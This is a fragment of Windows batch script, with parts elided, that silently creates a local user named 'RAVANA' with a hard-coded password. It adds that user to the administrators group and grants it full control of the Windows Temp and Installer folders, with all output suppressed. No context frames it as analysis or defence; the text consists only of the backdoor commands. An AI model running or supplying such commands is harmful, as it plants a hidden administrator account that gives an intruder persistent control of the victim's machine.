...
net user RAVANA Thuonghai001 /add >nul
net localgroup administrators RAVANA /add >nul
...
ICACLS C:\Windows\Temp /grant RAVANA:F >nul
ICACLS C:\Windows\installer /grant RAVANA:F >nul
